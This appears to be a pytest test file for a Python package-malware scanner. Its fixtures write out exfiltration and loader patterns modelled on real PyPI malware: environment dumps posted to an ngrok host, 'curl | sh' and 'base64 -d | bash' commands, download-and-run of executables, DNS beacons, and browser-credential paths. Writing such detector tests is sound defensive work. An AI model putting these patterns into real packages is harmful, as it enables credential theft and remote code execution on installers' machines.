import subprocess
import sys
import textwrap

import pytest

from pkg_sentry.pyscan import imports_of, nests_too_deeply, scan_python


def scan(code, role="runtime", path="pkg/mod.py"):
    return scan_python(path, textwrap.dedent(code), role)


def rules(code, role="runtime"):
    return sorted({f.rule for f in scan(code, role)})


# Shapes taken from real PyPI malware.

def test_exec_of_base64_in_setup_is_critical():
    found = scan('''
        import base64
        code = b"aW1wb3J0IG9z"
        exec(base64.b64decode(code))
    ''', role="setup", path="setup.py")
    hit = [f for f in found if f.rule == "exec-decoded"][0]
    assert hit.critical
    assert hit.where == "setup.py:4"
    assert "b64decode" in hit.snippet


@pytest.mark.parametrize(
    "code",
    [
        "import base64 as b\nexec(b.b64decode('eA=='))",
        "from base64 import b64decode as d\nexec(d('eA=='))",
        "exec(__import__('base64').b64decode('eA=='))",
        "import zlib, base64\nexec(zlib.decompress(base64.b64decode('eA==')))",
        "import marshal\nexec(marshal.loads(b'...'))",
        "exec(''.join(chr(c) for c in [112, 114]))",
        "exec(bytes([112, 114]).decode())",
        "from cryptography.fernet import Fernet\nexec(Fernet(k).decrypt(b'gAAA'))",
        "import base64\npayload = base64.b64decode(blob)\nexec(payload)",
        "import codecs\neval(compile(codecs.decode('cevag', 'rot13'), 'x', 'exec'))",
        "getattr(__import__('builtins'), 'exec')(__import__('base64').b64decode('eA=='))",
    ],
)
def test_hidden_code_is_found_however_it_is_written(code):
    assert "exec-decoded" in rules(code)


def test_custom_install_command():
    found = rules('''
        from setuptools import setup
        from setuptools.command.install import install

        class CrazyInstallStrat(install):
            def run(self):
                install.run(self)
                from main import main
                main()

        setup(name="bytesp", cmdclass={"install": CrazyInstallStrat})
    ''', role="setup")
    assert found == ["install-hook"]


def test_shell_and_network_during_install():
    found = rules('''
        import subprocess, requests
        from setuptools import setup
        subprocess.Popen("whoami", shell=True)
        requests.post("https://x.example/c", data={"a": 1})
        setup(name="x")
    ''', role="setup")
    assert found == ["network-at-install", "shell-at-install"]


def test_import_time_means_module_level_only():
    code = '''
        import subprocess
        subprocess.run(["id"])

        def helper():
            subprocess.run(["ls"])
    '''
    found = scan(code, role="import")
    assert [(f.rule, f.line) for f in found if "shell" in f.rule] == [
        ("shell-at-install", 3), ("shell", 6)]


def test_download_and_run_a_program():
    found = scan('''
        import requests, subprocess, os
        r = requests.get("https://cdn.discordapp.com/attachments/1/2/Windows.exe")
        open("upd.exe", "wb").write(r.content)
        subprocess.call(["upd.exe"])
    ''', role="setup")
    assert any(f.rule == "download-exec" and f.critical for f in found)


def test_downloading_and_running_later_counts_for_less():
    found = scan('''
        import requests, subprocess
        def update():
            r = requests.get("https://example.com/tool.exe")
            subprocess.call(["tool.exe"])
    ''', role="import")
    hit = [f for f in found if f.rule == "download-exec"][0]
    assert hit.value == 25 and not hit.critical


def test_exec_of_downloaded_code():
    assert "download-exec" in rules(
        "import urllib.request\nexec(urllib.request.urlopen('https://x/p').read())")


def test_environment_sent_to_ngrok():
    found = rules('''
        import os, urllib.request, urllib.parse
        def run_payload():
            data = dict(os.environ)
            encoded = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request("https://5cecdbdb0328.ngrok.app/c", encoded)
            urllib.request.urlopen(req)
    ''')
    assert found == ["env-dump", "exfil-endpoint"]


def test_machine_details_sent_out():
    found = rules('''
        import socket, getpass, requests
        info = {"h": socket.gethostname(), "u": getpass.getuser()}
        requests.get("https://x.example/", params=info)
    ''')
    assert "recon" in found


def test_steals_browser_passwords():
    found = rules('''
        import os
        base = os.getenv("LOCALAPPDATA")
        path = os.path.join(base, "Google", "Chrome", "User Data", "Local State")
    ''')
    assert found == ["secrets"]


def test_obfuscator_markers():
    armor = "from pyarmor_runtime_000000 import __pyarmor__\n__pyarmor__(__name__, __file__, b'x')"
    assert "obfuscated" in rules(armor)
    names = ["IlIlIlIl", "lIlIlIlI", "IIlIIlII", "llIIllII", "IlllIlll", "OO0O0OO0"]
    assert "obfuscated" in rules("\n".join(f"{n} = 1" for n in names))
    assert "obfuscated" in rules("import os\n" + "\n".join(f"{n} = os" for n in names))


def test_lines_of_underscores_are_not_obfuscation():
    line = "_" * 40
    assert rules(f"# {line}\nx = 1\n\"\"\"\n{line}\n\"\"\"\nimport os") == []


def test_big_encoded_blob():
    found = scan("data = '" + "QUJD" * 600 + "'")
    assert [(f.rule, f.value) for f in found] == [("obfuscated", 10)]


def test_unparsable_files_still_get_text_checks():
    found = rules('print "hi"\nexec base64.b64decode(x)\nurl = "https://webhook.site/x"')
    assert found == ["exfil-endpoint"]
    found = rules('print "x"\nexec(base64.b64decode(blob))')
    assert found == ["exec-decoded"]


def test_absurdly_deep_code_does_not_crash_the_scan():
    deep = "x = " + " + ".join(["1"] * 50_000) + "\nurl = 'https://webhook.site/abc'"
    assert "exfil-endpoint" in rules(deep)
    nested = "x = " + "[" * 5000 + "]" * 5000
    assert rules(nested) == []


def test_a_million_term_sum_doesnt_kill_the_process():
    code = ("from pkg_sentry.pyscan import scan_python\n"
            "src = 'x = ' + ' + '.join(['1'] * 1_000_000) + '\\nurl = \"https://webhook.site/a\"'\n"
            "print(sorted({f.rule for f in scan_python('setup.py', src, 'setup')}))")
    run = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=120)
    assert run.returncode == 0, run.stderr[-2000:]
    assert "exfil-endpoint" in run.stdout


@pytest.mark.parametrize("code, deep", [
    ("x = " + " + ".join(["1"] * 3500), True),
    ("x = a" + ".b" * 3500, True),
    ("x = f" + "()" * 3500, True),
    ("x = " + "-" * 3500 + "1", True),
    ("x = " + " + ".join(["1"] * 2000), False),
    ("x = [" + ", ".join(["-1"] * 20_000) + "]", False),
    ("d = {" + ", ".join(f"'k{i}': f(a.b[i] + 1)" for i in range(5000)) + "}", False),
    ("x = 1 + 1\n" * 5000, False),
    ("x = (\n" + " +\n".join(["1"] * 3500) + ")", True),
    ("s = '" + "+" * 10_000 + "'", False),
])
def test_depth_check(code, deep):
    assert nests_too_deeply(code) is deep


def test_main_guard_doesnt_run_on_import():
    found = scan('''
        import subprocess
        if __name__ == "__main__":
            subprocess.run(["make"])
    ''', role="import")
    assert [f.rule for f in found] == ["shell"]


def test_main_guard_with_extra_conditions():
    found = scan('''
        import sys, pty
        if sys.platform != "win32" and __name__ == "__main__":
            pty.spawn(sys.argv[1:])
    ''', role="import")
    assert [f.rule for f in found] == ["shell"]


def test_commands_built_from_variables_count_for_less():
    found = scan('''
        import subprocess
        subprocess.check_call(" ".join(compiler) + " -march=native -E -")
        subprocess.check_call("whoami")
    ''', role="setup")
    points = sorted(f.value for f in found if f.rule == "shell-at-install")
    assert points == [15, 30]


@pytest.mark.parametrize(
    "call",
    ['subprocess.run(["/bin/sh", "autogen.sh"])', 'subprocess.check_call(["./build_bundled.sh"])',
     'os.system("twine upload dist/*")', 'subprocess.check_output(["brew", "--prefix"])',
     'os.system("rm -rf dist")'],
)
def test_more_build_commands(call):
    assert rules(f"import os, subprocess\n{call}", role="setup") == ["shell"]


def test_shell_dash_c_is_not_a_build_script():
    assert "shell-at-install" in rules('import subprocess\nsubprocess.run(["sh", "-c", "id"])',
                                       role="setup")


def test_detecting_pyarmor_is_not_using_it():
    assert rules("def is_obfuscated(m):\n    return 'pyarmor_runtime' in m.__name__") == []


def test_build_tools_in_setup_are_only_a_weak_sign():
    found = rules('''
        import subprocess, sys
        sha = subprocess.check_output(["git", "rev-parse", "HEAD"])
        subprocess.check_call([sys.executable, "-m", "pip", "--version"])
        subprocess.run("cmake --build .", shell=True)
    ''', role="setup")
    assert found == ["shell"]


def test_environment_handed_to_a_subprocess_is_fine():
    found = rules('''
        import os, subprocess, requests
        env = os.environ.copy()
        env["X"] = "1"
        subprocess.run(["tool"], env=env)
        requests.get("https://api.example.com")
    ''')
    assert "env-dump" not in found


def test_environment_posted_directly():
    found = rules("import os, requests\nrequests.post('https://x.example', json=os.environ)")
    assert "env-dump" in found


# Normal code that must stay quiet.

@pytest.mark.parametrize(
    "code",
    [
        # reading the version this way is common in setup.py
        'exec(open("mypkg/version.py").read())',
        'with open("mypkg/__about__.py") as f:\n    exec(f.read(), about)',
        'from pathlib import Path\nexec(Path("pkg/release.py").read_text())',
        'from setuptools import setup\nfrom setuptools.command.sdist import sdist\n'
        'class S(sdist):\n    pass\nsetup(name="x", cmdclass={"sdist": S})',
        # building C extensions
        'from setuptools import setup\nfrom setuptools.command.build_ext import build_ext\n'
        'class B(build_ext):\n    pass\nsetup(name="x", cmdclass={"build_ext": B})',
        'from setuptools import setup\nsetup(name="x", version="1.0", packages=["x"])',
    ],
)
def test_normal_setup_files(code):
    assert rules(code, role="setup") == []


@pytest.mark.parametrize(
    "code",
    [
        "import subprocess, os\nsubprocess.run(['git', 'status'], env=os.environ.copy())",
        "import os\nhome = os.environ.get('HOME')\ntoken = os.environ['TOKEN']",
        "import base64\ndata = base64.b64decode(s)",
        "import requests\ndef fetch(u):\n    return requests.get(u).json()",
        "result = eval(expression, {'__builtins__': {}})",
        "template = compile(source, filename, 'exec')",
        "import socket\nhost = socket.gethostname()",
    ],
)
def test_normal_library_code(code):
    found = rules(code)
    assert found in ([], ["shell"]), found


def test_imports_of():
    found = imports_of("from main import main\nimport os\nimport a.b as c\nfrom . import x")
    assert {(0, "main"), (0, "os"), (0, "a.b"), (1, "x")} <= found
    assert imports_of("print 'py2'") == set()


# Tricks found in the older half of the malware samples.

def test_decoded_shell_command():
    found = scan("import os\nfrom base64 import b64decode as b64d\nos.system(b64d('Y3VybA=='))",
                 role="setup")
    hit = [f for f in found if f.rule == "exec-decoded"][0]
    assert hit.critical and hit.message == "decodes a hidden command and runs it"


def test_python_dash_c_with_decoded_code():
    found = rules("import subprocess, base64, sys\n"
                  "subprocess.Popen([sys.executable, '-c', base64.b64decode(cmd).decode()])")
    assert "exec-decoded" in found


def test_aliased_dangerous_functions_are_followed():
    found = rules('''
        import os
        _ssystem = os.system
        _ssystem("start pythonw.exe evil.py")
    ''', role="setup")
    assert "shell-at-install" in found


def test_functions_called_at_the_top_level_run_on_import():
    found = scan('''
        import requests
        def beacon():
            requests.post("https://x.example/c", data={"x": 1})
        def unused():
            requests.get("https://x.example/other")
        beacon()
    ''', role="import")
    hits = [f.line for f in found if f.rule == "network-at-install"]
    assert hits == [4]


def test_machine_details_sent_to_a_server():
    found = scan('''
        import requests, socket, getpass
        info = {"host": socket.gethostname(), "user": getpass.getuser()}
        def go():
            requests.post("https://x.example/collect", json=info)
    ''')
    recon = [f for f in found if f.rule == "recon"]
    assert recon and max(f.value for f in recon) == 25


def test_self_uninstall_during_install():
    found = rules("import os\nos.system('pip3 --verbose uninstall ' + NAME + ' -y')", role="setup")
    assert "hides-traces" in found
    assert "hides-traces" not in rules("print('run pip uninstall x to remove it')")


def test_base64_piped_into_a_shell():
    found = scan("import os\nos.system('echo %s|base64 -d|bash' % encoded)", role="setup")
    assert any(f.rule == "exec-decoded" and f.critical for f in found)


def test_powershell_download_built_on_another_line():
    found = rules('''
        import subprocess
        download_command = "Invoke-WebRequest -Uri https://x.example/a.exe -OutFile a.exe"
        subprocess.run(["powershell", "-Command", download_command])
    ''', role="setup")
    assert "hidden-powershell" in found


def test_looking_up_your_own_ip_is_not_a_beacon():
    found = rules("import socket\nip = socket.gethostbyname(socket.gethostname())")
    assert "recon" not in found


def test_hostname_inside_a_dns_query_is_a_beacon():
    found = scan("import socket, getpass\n"
                 "socket.gethostbyname(f'{getpass.getuser()}.{socket.gethostname()}.x.oast.fun')")
    assert any(f.rule == "recon" and f.value == 25 for f in found)


def test_encoding_cookie_is_respected():
    # In UTF-7, +AAo- is a newline, so this "comment" is really a line of code.
    code = b"# coding: utf-7\nimport os\n#+AAo-os.system('id')\n"
    assert "shell-at-install" in {f.rule for f in scan_python("pkg/mod.py", code, "setup")}


def test_main_guard_written_backwards_or_negated():
    found = scan('''
        import subprocess
        if "__main__" == __name__:
            subprocess.run(["make"])
        if __name__ != "__main__":
            subprocess.run(["whoami"])
    ''', role="import")
    assert {(f.rule, f.line) for f in found} == {("shell", 4), ("shell-at-install", 6)}


@pytest.mark.parametrize(
    "code",
    [
        "import base64\ndef d(s):\n    return base64.b64decode(s)\nexec(d('eA=='))",
        "exec('))(dlrow olleh(tnirp'[::-1])",
        "import base64\nif (c := base64.b64decode('eA==')):\n    exec(c)",
    ],
)
def test_decoding_hidden_behind_wrappers(code):
    assert "exec-decoded" in rules(code, role="setup")


def test_file_references():
    from pkg_sentry.pyscan import file_references
    refs = file_references("exec(open('a/b.py').read())\nrunpy.run_path('c.py')\n"
                           "subprocess.call(['sh', 'install.sh'])")
    assert {"a/b.py", "c.py", "install.sh"} <= refs


def test_reversing_a_list_isnt_decoding():
    code = "import subprocess\nshape = dims[::-1]\nsubprocess.run(['echo', *shape])"
    assert "exec-decoded" not in rules(code, role="setup")


def test_files_that_are_only_read_arent_followed():
    from pkg_sentry.pyscan import file_references
    code = ("long_description = open('README.rst').read()\n"
            "with open('pkg/__init__.py') as f:\n    version = f.read()\n"
            "cmd = ['sh', 'build/run.sh']\nsubprocess.check_call(cmd)\n")
    assert file_references(code) == {"build/run.sh"}


def test_used_imports():
    from pkg_sentry.pyscan import used_imports
    code = ("from helpers import go, VERSION\nimport tools.build as tb\nimport stamp\n"
            "class Install(stamp.Base): pass\n"
            "def later():\n    tb.compile_all()\n"
            "go()\nsetup(version=VERSION, cmdclass={'install': Install})\n")
    assert {(0, "helpers.go"), (0, "stamp.Base")} <= used_imports(code, everywhere=False)
    assert (0, "helpers.VERSION") not in used_imports(code)
    assert (0, "tools.build") not in used_imports(code, everywhere=False)
    assert (0, "tools.build") in used_imports(code)


def test_text_hits_at_module_level_count_as_install_time_on_import():
    code = '''
import os
os.system("curl -s https://x.example/a | sh")
try:
    def later():
        os.system("curl -s https://x.example/b | sh")
except ImportError:
    pass
'''
    found = [(f.rule, f.line, f.critical) for f in scan_python("pkg/m.py", code, "import",
                                                             during_install=True)
             if f.rule == "download-exec"]
    assert ("download-exec", 3, True) in found
    assert ("download-exec", 6, False) in found


def test_a_url_in_a_library_module_isnt_install_time():
    code = "API = 'https://api.telegram.org/bot'\ndef send(t, m):\n    post(API + t, m)\n"
    found = scan_python("tqdm/contrib/telegram.py", code, "import")
    assert not any(f.critical for f in found)


def test_decoding_into_an_attribute_doesnt_taint_self():
    code = '''
import base64, subprocess
class Token:
    def load(self, content):
        self._data = base64.b64decode(content).decode()
    def run(self):
        subprocess.Popen([self._cmd] + self._args)
'''
    assert "exec-decoded" not in rules(code)


def test_decoded_data_kept_on_an_attribute_is_still_followed():
    code = '''
import base64
class Loader:
    def __init__(self, blob):
        self.payload = base64.b64decode(blob)
        exec(self.payload)
'''
    assert "exec-decoded" in rules(code, role="setup")


def test_commands_pip_never_runs_arent_followed():
    from pkg_sentry.pyscan import file_references
    code = '''
import subprocess
class import_data(Command):
    def run(self):
        subprocess.check_call(["python", "scripts/download.py"])
class build_stuff(Command):
    def run(self):
        subprocess.check_call(["sh", "scripts/build.sh"])
setup(cmdclass={"import_data": import_data, "build_py": build_stuff})
'''
    assert file_references(code) == {"scripts/build.sh"}


def test_requests_helpers_arent_network_calls():
    code = "import requests\nUA = requests.utils.default_user_agent()\nr = requests.get('https://x')"
    found = scan_python("pkg/m.py", code, "import")
    assert [f.line for f in found if f.rule == "network-at-install"] == [3]
